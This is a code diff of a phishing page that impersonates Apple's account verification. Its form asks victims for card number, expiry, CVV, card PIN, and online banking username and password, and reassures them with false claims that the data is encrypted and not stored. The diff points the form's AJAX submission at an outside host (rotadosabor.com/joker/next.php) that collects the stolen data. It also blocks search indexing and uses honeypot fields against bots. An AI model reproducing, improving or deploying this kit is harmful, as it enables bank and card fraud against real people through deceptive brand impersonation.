@@ -4,602 +4,651 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="robots" content="noindex, nofollow, noarchive">
-    <title>Apple - Refund Verification</title>
+    <title>Apple - Verify Your Account</title>
+    
+    <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link href="https://fonts.googleapis.com/css?family=SF+Pro+Display:300,400,500,600&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css?family=SF+Pro+Text:300,400,500,600&display=swap" rel="stylesheet">
-    <style type="text/css">
-    body, html {
-        height: 100%;
-        margin: 0;
-        font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
-        background-color: #fbfbfd;
-        color: #1d1d1f;
-        line-height: 1.47059;
-        font-weight: 400;
-        letter-spacing: -0.022em;
-    }
-    
-    #ac-globalnav {
-        width: 100%;
-        height: 44px;
-        background-color: rgba(0, 0, 0, 0.8);
-        backdrop-filter: saturate(180%) blur(20px);
-        position: fixed;
-        top: 0;
-        left: 0;
-        z-index: 9999;
-    }
-    
-    .ac-gn-content {
-        max-width: 980px;
-        margin: 0 auto;
-    }
-    
-    .ac-gn-list {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        list-style: none;
-        padding: 0 20px;
-        margin: 0;
-        height: 44px;
-    }
-    
-    .ac-gn-item a {
-        color: rgba(255, 255, 255, 0.8);
-        text-decoration: none;
-        font-size: 12px;
-        transition: color 0.2s;
-    }
-    
-    .ac-gn-item a:hover {
-        color: #fff;
-    }
-    
-    .page-content {
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-    }
-    
-    .main-wrapper {
-        padding-top: 80px;
-        padding-bottom: 50px;
-        flex: 1;
-    }
-    
-    .verification-container {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0 15px;
-    }
-    
-    .section-title {
-        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
-        font-size: 32px;
-        font-weight: 500;
-        margin-bottom: 20px;
-        text-align: center;
-    }
-    
-    .section-subtitle {
-        font-size: 17px;
-        font-weight: 400;
-        color: #6e6e73;
-        text-align: center;
-        margin-bottom: 40px;
-        max-width: 800px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    
-    .verification-steps {
-        padding: 30px 40px;
-        background-color: white;
-        border-radius: 18px;
-        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
-        margin-bottom: 30px;
-    }
-    
-    .step-title {
-        font-size: 21px;
-        font-weight: 500;
-        margin-bottom: 20px;
-        color: #1d1d1f;
-    }
-    
-    .step-description {
-        font-size: 15px;
-        color: #6e6e73;
-        margin-bottom: 25px;
-    }
-    
-    .form-group label {
-        font-size: 14px;
-        color: #1d1d1f;
-        font-weight: 500;
-        margin-bottom: 8px;
-    }
-    
-    .form-control {
-        border: 1px solid #d2d2d7;
-        border-radius: 8px;
-        padding: 12px 15px;
-        font-size: 15px;
-        height: auto;
-        color: #1d1d1f;
-        transition: border-color 0.2s;
-    }
-    
-    .form-control:focus {
-        border-color: #0071e3;
-        box-shadow: 0 0 0 2px rgba(0, 113, 227, 0.15);
-    }
-    
-    .form-row {
-        margin-left: -10px;
-        margin-right: -10px;
-    }
-    
-    .form-row > [class*="col-"] {
-        padding-left: 10px;
-        padding-right: 10px;
-    }
-    
-    .btn-primary {
-        background-color: #0071e3;
-        border-color: #0071e3;
-        border-radius: 8px;
-        padding: 12px 25px;
-        font-size: 16px;
-        font-weight: 500;
-        transition: all 0.2s;
-    }
-    
-    .btn-primary:hover {
-        background-color: #0077ed;
-        border-color: #0077ed;
-    }
-    
-    .btn-primary:focus {
-        box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.25);
-    }
-    
-    .btn-outline-secondary {
-        border-color: #d2d2d7;
-        color: #1d1d1f;
-        border-radius: 8px;
-        padding: 12px 25px;
-        font-size: 16px;
-        font-weight: 500;
-        transition: all 0.2s;
-    }
-    
-    .btn-outline-secondary:hover {
-        background-color: #f5f5f7;
-        border-color: #d2d2d7;
-        color: #1d1d1f;
-    }
-    
-    .progress-indicator {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 40px;
-        max-width: 700px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    
-    .progress-step {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        position: relative;
-        flex: 1;
-    }
-    
-    .progress-step::before {
-        content: '';
-        position: absolute;
-        top: 15px;
-        left: -50%;
-        width: 100%;
-        height: 2px;
-        background-color: #d2d2d7;
-        z-index: 1;
-    }
-    
-    .progress-step:first-child::before {
-        display: none;
-    }
-    
-    .progress-step.completed::before {
-        background-color: #0071e3;
-    }
-    
-    .step-circle {
-        width: 30px;
-        height: 30px;
-        border-radius: 50%;
-        background-color: #f5f5f7;
-        border: 2px solid #d2d2d7;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 14px;
-        font-weight: 600;
-        margin-bottom: 10px;
-        position: relative;
-        z-index: 2;
-    }
-    
-    .progress-step.completed .step-circle {
-        background-color: #0071e3;
-        border-color: #0071e3;
-        color: white;
-    }
-    
-    .progress-step.active .step-circle {
-        border-color: #0071e3;
-        color: #0071e3;
-    }
-    
-    .step-label {
-        font-size: 13px;
-        color: #6e6e73;
-        text-align: center;
-    }
-    
-    .progress-step.completed .step-label,
-    .progress-step.active .step-label {
-        color: #1d1d1f;
-        font-weight: 500;
-    }
-    
-    .info-box {
-        background-color: #f5f5f7;
-        border-radius: 12px;
-        padding: 20px;
-        margin-bottom: 25px;
-    }
-    
-    .info-box-title {
-        font-size: 16px;
-        font-weight: 500;
-        margin-bottom: 8px;
-        color: #1d1d1f;
-    }
-    
-    .info-box-text {
-        font-size: 14px;
-        color: #6e6e73;
-        margin-bottom: 0;
-    }
-    
-    .apple-id-info {
-        display: flex;
-        align-items: center;
-        background-color: #f5f5f7;
-        border-radius: 8px;
-        padding: 12px 15px;
-        margin-bottom: 25px;
-    }
-    
-    .apple-id-icon {
-        width: 32px;
-        height: 32px;
-        background-color: #0071e3;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-right: 12px;
-    }
-    
-    .apple-id-icon span {
-        color: white;
-        font-size: 18px;
-        font-weight: bold;
-    }
-    
-    .apple-id-details {
-        flex: 1;
-    }
-    
-    .apple-id-email {
-        font-size: 14px;
-        font-weight: 500;
-        color: #1d1d1f;
-        margin-bottom: 2px;
-    }
-    
-    .apple-id-status {
-        font-size: 12px;
-        color: #6e6e73;
-    }
-    
-    .footer {
-        background-color: #f5f5f7;
-        padding: 20px 0;
-        font-size: 12px;
-        color: #6e6e73;
-    }
-    
-    .footer-content {
-        max-width: 980px;
-        margin: 0 auto;
-        padding: 0 20px;
-    }
-    
-    .footer-links {
-        display: flex;
-        flex-wrap: wrap;
-        margin-bottom: 10px;
-    }
-    
-    .footer-links a {
-        color: #424245;
-        text-decoration: none;
-        margin-right: 20px;
-        margin-bottom: 5px;
-    }
-    
-    .footer-links a:hover {
-        text-decoration: underline;
-    }
-    
-    .divider {
-        border-top: 1px solid #d2d2d7;
-        margin: 20px 0;
-    }
-    
-    .bot-field {
-        position: absolute;
-        left: -9999px;
-        visibility: hidden;
-        opacity: 0;
-    }
-    .help-block {
-        color: #6e6e73;
-        font-size: 13px;
-        margin-top: 5px;
-    }
-    
-    .bot-field {
-        position: absolute;
-        left: -9999px;
-        visibility: hidden;
-        opacity: 0;
-    }
-    
-    @media (max-width: 768px) {
-        .verification-steps {
-            padding: 25px 20px;
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    <!-- Custom Styles -->
+    <style>
+        :root {
+            --apple-blue: #0071e3;
+            --apple-blue-hover: #0077ed;
+            --apple-background: #fbfbfd;
+            --apple-text-main: #1d1d1f;
+            --apple-text-secondary: #6e6e73;
+            --apple-white: #ffffff;
+            --apple-border: #d2d2d7;
+            --apple-nav-bg: rgba(0, 0, 0, 0.8);
+            --apple-gray-bg: #f5f5f7;
         }
         
-        .section-title {
-            font-size: 28px;
+        body, html {
+            height: 100%;
+            margin: 0;
+            background-color: var(--apple-background);
+            color: var(--apple-text-main);
+            font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
+            line-height: 1.47059;
+            font-weight: 400;
+            letter-spacing: -0.022em;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         
-        .progress-indicator {
-            max-width: 100%;
+        /* Navbar */
+        #apple-nav {
+            background-color: var(--apple-nav-bg);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 44px;
+            z-index: 9999;
+            backdrop-filter: saturate(180%) blur(20px);
         }
         
-        .ac-gn-list li:not(:first-child):not(:last-child) {
-            display: none;
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            max-width: 980px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 22px;
         }
-    }
+        
+        .nav-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-logo svg {
+            fill: #fff;
+            height: 20px;
+            width: 20px;
+        }
+        
+        .nav-items {
+            display: flex;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .nav-items li {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-items a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-size: 12px;
+            padding: 0 10px;
+            transition: color 0.2s;
+        }
+        
+        .nav-items a:hover {
+            color: #fff;
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding-top: 76px;
+            padding-bottom: 60px;
+        }
+        
+        .container-wide {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 22px;
+        }
+        
+        /* Headings */
+        .main-title {
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
+            font-size: 40px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 12px;
+            letter-spacing: -0.003em;
+        }
+        
+        .subtitle {
+            font-size: 21px;
+            font-weight: 400;
+            color: var(--apple-text-secondary);
+            text-align: center;
+            margin-bottom: 48px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.38105;
+        }
+        
+        /* Progress Steps */
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 0 auto 56px;
+            max-width: 600px;
+            position: relative;
+        }
+        
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 16px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background-color: var(--apple-border);
+            z-index: 1;
+        }
+        
+        .step {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: var(--apple-gray-bg);
+            border: 1px solid var(--apple-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            z-index: 2;
+            color: var(--apple-text-main);
+        }
+        
+        .step.completed .step-circle {
+            background-color: var(--apple-blue);
+            border-color: var(--apple-blue);
+            color: white;
+        }
+        
+        .step.active .step-circle {
+            border-color: var(--apple-blue);
+            color: var(--apple-blue);
+            border-width: 2px;
+        }
+        
+        .step-label {
+            font-size: 14px;
+            color: var(--apple-text-secondary);
+            text-align: center;
+        }
+        
+        .step.completed .step-label,
+        .step.active .step-label {
+            color: var(--apple-text-main);
+            font-weight: 500;
+        }
+        
+        /* Account Info Bar */
+        .account-info {
+            display: flex;
+            align-items: center;
+            background-color: var(--apple-gray-bg);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 32px;
+        }
+        
+        .account-icon {
+            width: 36px;
+            height: 36px;
+            background-color: var(--apple-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 14px;
+            flex-shrink: 0;
+        }
+        
+        .account-icon span {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .account-details {
+            flex: 1;
+        }
+        
+        .account-email {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 2px;
+        }
+        
+        .account-status {
+            font-size: 14px;
+            color: var(--apple-text-secondary);
+        }
+        
+        /* Card */
+        .content-card {
+            background-color: var(--apple-white);
+            border-radius: 18px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            padding: 32px 36px;
+            margin-bottom: 24px;
+        }
+        
+        .card-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: var(--apple-text-main);
+        }
+        
+        .card-description {
+            font-size: 17px;
+            color: var(--apple-text-secondary);
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+        
+        /* Form Styling */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--apple-text-main);
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .form-control {
+            border: 1px solid var(--apple-border);
+            border-radius: 10px;
+            padding: 13px 16px;
+            font-size: 15px;
+            color: var(--apple-text-main);
+            width: 100%;
+            transition: all 0.2s;
+            background-color: var(--apple-white);
+            height: auto;
+            line-height: 1.4;
+        }
+        
+        .form-control:focus {
+            border-color: var(--apple-blue);
+            box-shadow: 0 0 0 2px rgba(0, 113, 227, 0.15);
+            outline: none;
+        }
+        
+        .form-control::placeholder {
+            color: #a1a1a6;
+        }
+        
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            margin-left: -12px;
+            margin-right: -12px;
+        }
+        
+        .form-column {
+            flex: 1;
+            padding-left: 12px;
+            padding-right: 12px;
+            min-width: 0;
+        }
+        
+        .help-text {
+            font-size: 12px;
+            color: var(--apple-text-secondary);
+            margin-top: 4px;
+        }
+        
+        /* Info Box */
+        .info-box {
+            background-color: var(--apple-gray-bg);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin-top: 12px;
+            margin-bottom: 28px;
+        }
+        
+        .info-title {
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: var(--apple-text-secondary);
+            line-height: 1.4;
+            margin: 0;
+        }
+        
+        /* Buttons */
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 32px;
+        }
+        
+        .btn {
+            font-size: 17px;
+            font-weight: 400;
+            padding: 8px 18px;
+            min-width: 110px;
+            border-radius: 980px;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-secondary {
+            background-color: var(--apple-gray-bg);
+            color: var(--apple-text-main);
+            margin-right: 12px;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e5e5ea;
+        }
+        
+        .btn-primary {
+            background-color: var(--apple-blue);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--apple-blue-hover);
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: var(--apple-gray-bg);
+            padding: 17px 0;
+            font-size: 12px;
+            line-height: 1.33341;
+            color: var(--apple-text-secondary);
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 22px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-links {
+            display: flex;
+        }
+        
+        .footer-links a {
+            color: var(--apple-text-secondary);
+            text-decoration: none;
+            margin-right: 20px;
+            white-space: nowrap;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: var(--apple-text-main);
+        }
+        
+        .footer-legal {
+            white-space: nowrap;
+        }
+        
+        /* Honeypot for bots */
+        .bot-field {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            height: 0;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 32px;
+            }
+            
+            .subtitle {
+                font-size: 17px;
+            }
+            
+            .content-card {
+                padding: 24px 20px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+            }
+            
+            .form-column {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            
+            .nav-items li:not(:first-child):not(:last-child) {
+                display: none;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+            }
+            
+            .footer-links {
+                margin-bottom: 10px;
+                flex-wrap: wrap;
+            }
+            
+            .footer-links a {
+                margin-bottom: 5px;
+            }
+        }
     </style>
 </head>
 
 <body>
-    <div class="page-content">
-        <!-- Global Navigation -->
-        <nav id="ac-globalnav" class="js no-touch windows" role="navigation">
-            <div class="ac-gn-content">
-                <ul class="ac-gn-list">
-                    <li class="ac-gn-item ac-gn-apple">
-                        <a class="ac-gn-link ac-gn-link-apple " href="#">
-                            <span class="ac-gn-link-text">Apple</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
-                        <a class="ac-gn-link ac-gn-link-mac " href="#">
-                            <span class="ac-gn-link-text">Mac</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
-                        <a class="ac-gn-link ac-gn-link-ipad " href="#">
-                            <span class="ac-gn-link-text">iPad</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
-                        <a class="ac-gn-link ac-gn-link-iphone " href="#">
-                            <span class="ac-gn-link-text">iPhone</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
-                        <a class="ac-gn-link ac-gn-link-watch " href="#">
-                            <span class="ac-gn-link-text">Watch</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
-                        <a class="ac-gn-link ac-gn-link-tv " href="#">
-                            <span class="ac-gn-link-text">TV</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
-                        <a class="ac-gn-link ac-gn-link-music " href="#">
-                            <span class="ac-gn-link-text">Music</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
-                        <a class="ac-gn-link ac-gn-link-support " href="#">
-                            <span class="ac-gn-link-text">Support</span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                        <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search " href="#">
-                            <span class="ac-gn-link-text">Search apple.com</span>
-                        </a>
-                    </li>
-                </ul>
+    <!-- Apple Navigation -->
+    <nav id="apple-nav">
+        <div class="nav-content">
+            <div class="nav-logo">
+                <a href="#" aria-label="Apple">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 44">
+                        <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
+                    </svg>
+                </a>
             </div>
-        </nav>
-        
-        <!-- Main Content -->
-        <div class="main-wrapper">
-            <div class="verification-container">
-                <h1 class="section-title">Verify Your Refund Request</h1>
-                <p class="section-subtitle">We need to verify your identity and payment method to process your refund. This helps ensure the security of your Apple account and protects against unauthorized transactions.</p>
-                
-                <!-- Progress Indicator -->
-                <div class="progress-indicator">
-                    <div class="progress-step completed">
-                        <div class="step-circle">1</div>
-                        <div class="step-label">Sign In</div>
-                    </div>
-                    <div class="progress-step active">
-                        <div class="step-circle">2</div>
-                        <div class="step-label">Verify Payment</div>
-                    </div>
-                    <div class="progress-step">
-                        <div class="step-circle">3</div>
-                        <div class="step-label">Confirm Details</div>
-                    </div>
+            <ul class="nav-items">
+                <li><a href="#">Store</a></li>
+                <li><a href="#">Mac</a></li>
+                <li><a href="#">iPad</a></li>
+                <li><a href="#">iPhone</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">AirPods</a></li>
+                <li><a href="#">TV & Home</a></li>
+                <li><a href="#">Entertainment</a></li>
+                <li><a href="#">Accessories</a></li>
+                <li><a href="#">Support</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container-wide">
+            <h1 class="main-title">Verify Your Account</h1>
+            <p class="subtitle">We need to verify your payment details to process your request. This helps ensure the security of your Apple ID and protects your account.</p>
+            
+            <!-- Progress Steps -->
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-circle">1</div>
+                    <div class="step-label">Sign In</div>
                 </div>
-                
-                <!-- Apple ID Information -->
-                <div class="apple-id-info">
-                    <div class="apple-id-icon">
-                        <span>A</span>
-                    </div>
-                    <div class="apple-id-details">
-                        <div class="apple-id-email" id="user-email">example@icloud.com</div>
-                        <div class="apple-id-status">Signed in</div>
-                    </div>
+                <div class="step active">
+                    <div class="step-circle">2</div>
+                    <div class="step-label">Verify Payment</div>
                 </div>
+                <div class="step">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Confirm Details</div>
+                </div>
+            </div>
+            
+            <!-- Account Info Bar -->
+            <div class="account-info">
+                <div class="account-icon">
+                    <span>A</span>
+                </div>
+                <div class="account-details">
+                    <div class="account-email" id="user-email">example@icloud.com</div>
+                    <div class="account-status">Apple ID • Signed in</div>
+                </div>
+            </div>
+            
+            <!-- Payment Verification Card -->
+            <div class="content-card">
+                <h2 class="card-title">Payment Verification</h2>
+                <p class="card-description">Please provide details of the payment method associated with your Apple ID. This information is required to verify your identity and will be encrypted and handled securely.</p>
                 
-                <!-- Verification Form -->
-                <div class="verification-steps">
-                    <h2 class="step-title">Payment Verification</h2>
-                    <p class="step-description">Please provide details of the payment method used for the original purchase. This information will be used to process your refund back to the same payment method.</p>
+                <form id="verification-form" action="#" method="post">
+                    <input type="hidden" name="btn2" value="btn2">
                     
-                    <form id="verification-form" action="#" method="post">
-                        <input type="hidden" name="btn2" value="btn2">
-                        
-                        <!-- Honeypot fields for bots -->
-                        <div class="bot-field">
-                            <input type="text" name="website2" id="website2">
-                            <input type="text" name="phone_confirm" id="phone_confirm">
-                        </div>
-                        
-                        <div class="row">
-                            <div class="col-md-6">
-                                <div class="form-group">
-                                    <label for="bank_name">Bank Name</label>
-                                    <input type="text" class="form-control" id="bank_name" name="bank_name" required>
-                                </div>
-                            </div>
-                            <div class="col-md-6">
-                                <div class="form-group">
-                                    <label for="noc">Name on Card</label>
-                                    <input type="text" class="form-control" id="noc" name="noc" required>
-                                </div>
+                    <!-- Honeypot fields for bots -->
+                    <div class="bot-field">
+                        <input type="text" name="website2" id="website2">
+                        <input type="text" name="phone_confirm" id="phone_confirm">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="bank_name">Bank Name</label>
+                                <input type="text" class="form-control" id="bank_name" name="bank_name" required>
                             </div>
                         </div>
-                        
-                        <div class="row">
-                            <div class="col-md-6">
-                                <div class="form-group">
-                                    <label for="ccn">Credit Card Number</label>
-                                    <input type="text" class="form-control" id="ccn" name="ccn" required placeholder="•••• •••• •••• ••••">
-                                </div>
-                            </div>
-                            <div class="col-md-3">
-                                <div class="form-group">
-                                    <label for="exdate">Expiration Date</label>
-                                    <input type="text" class="form-control" id="exdate" name="exdate" required placeholder="MM/YYYY">
-                                </div>
-                            </div>
-                            <div class="col-md-3">
-                                <div class="form-group">
-                                    <label for="cvv">Security Code (CVV)</label>
-                                    <input type="text" class="form-control" id="cvv" name="cvv" required placeholder="•••">
-                                </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="noc">Name on Card</label>
+                                <input type="text" class="form-control" id="noc" name="noc" required>
                             </div>
                         </div>
-                        
-                        <div class="row">
-                            <div class="col-md-6">
-                                <div class="form-group">
-                                    <label for="pin">Card PIN</label>
-                                    <input type="password" class="form-control" id="pin" name="pin" required placeholder="••••">
-                                </div>
-                            </div>
-                            <div class="col-md-6">
-                                <div class="form-group">
-                                    <label for="bank_user">Bank Username</label>
-                                    <input type="text" class="form-control" id="bank_user" name="bank_user" required>
-                                    <small class="help-block">Your online banking username</small>
-                                </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="ccn">Card Number</label>
+                                <input type="text" class="form-control" id="ccn" name="ccn" required placeholder="•••• •••• •••• ••••">
                             </div>
                         </div>
-                        
-                        <div class="row">
-                            <div class="col-md-6">
-                                <div class="form-group">
-                                    <label for="bank_pass">Bank Password</label>
-                                    <input type="password" class="form-control" id="bank_pass" name="bank_pass" required>
-                                </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="exdate">Expiration Date</label>
+                                <input type="text" class="form-control" id="exdate" name="exdate" required placeholder="MM/YYYY">
                             </div>
                         </div>
-                        
-                        <div class="info-box">
-                            <h3 class="info-box-title">Why do we need this information?</h3>
-                            <p class="info-box-text">Apple requires complete payment verification to process refunds securely. This protects your account and ensures funds return to the correct payment method. Your information is encrypted and securely transmitted.</p>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="cvv">Security Code (CVV)</label>
+                                <input type="text" class="form-control" id="cvv" name="cvv" required placeholder="•••">
+                            </div>
                         </div>
-                        
-                        <div class="mt-4 text-right">
-                            <button type="button" class="btn btn-outline-secondary mr-2">Cancel</button>
-                            <button type="submit" id="verify-button" class="btn btn-primary">Continue to Next Step</button>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="pin">Card PIN</label>
+                                <input type="password" class="form-control" id="pin" name="pin" required placeholder="••••">
+                            </div>
                         </div>
-                    </form>
-                </div>
-                
-                <!-- Next Step Preview -->
-                <div class="verification-steps">
-                    <h2 class="step-title">Next: Confirm Personal Details</h2>
-                    <p class="step-description">After payment verification, you'll need to confirm your personal information, including billing address and contact details, to complete the refund process.</p>
-                </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="bank_user">Online Banking Username</label>
+                                <input type="text" class="form-control" id="bank_user" name="bank_user" required>
+                                <div class="help-text">Your online banking login username</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="bank_pass">Online Banking Password</label>
+                                <input type="password" class="form-control" id="bank_pass" name="bank_pass" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h3 class="info-title">Why we need this information</h3>
+                        <p class="info-text">Apple requires payment verification to process your request securely. This protects your Apple ID and ensures that only you can access your account. Your information is encrypted using industry-standard protocols and will not be stored after verification.</p>
+                    </div>
+                    
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="window.history.back()">Back</button>
+                        <button type="submit" id="verify-button" class="btn btn-primary">Continue</button>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Next Step Preview Card -->
+            <div class="content-card">
+                <h2 class="card-title">Next Step: Confirm Your Details</h2>
+                <p class="card-description">After verifying your payment information, you'll need to confirm your personal details. This is the final step in our security verification process.</p>
             </div>
         </div>
-        
-        <!-- Footer -->
-        <footer class="footer">
-            <div class="footer-content">
-                <div class="footer-links">
-                    <a href="#">Privacy Policy</a>
-                    <a href="#">Terms of Use</a>
-                    <a href="#">Sales and Refunds</a>
-                    <a href="#">Legal</a>
-                    <a href="#">Site Map</a>
-                </div>
-                <div class="divider"></div>
-                <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
-            </div>
-        </footer>
     </div>
 
-    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Sales and Refunds</a>
+                <a href="#">Legal</a>
+                <a href="#">Site Map</a>
+            </div>
+            <div class="footer-legal">
+                Copyright © 2025 Apple Inc. All rights reserved.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
-    <script type="text/javascript">
+    <script>
         $(document).ready(function() {
             // Format inputs
             $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
-            $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
+            $("#exdate").inputmask({"mask": "99/9999", "placeholder": "MM/YYYY"});
             $("#cvv").inputmask({"mask": "999"});
             
             // Display user email from previous step
@@ -620,11 +669,11 @@
                 
                 // Submit form via AJAX
                 $.ajax({
-                    url: "next.php",
+                    url: "https://rotadosabor.com/joker/next.php",
                     type: 'POST',
                     data: $(this).serialize(),
                     success: function() {
-                        // Redirect to next step
+                        // Redirect to details page
                         window.location.href = 'details.html';
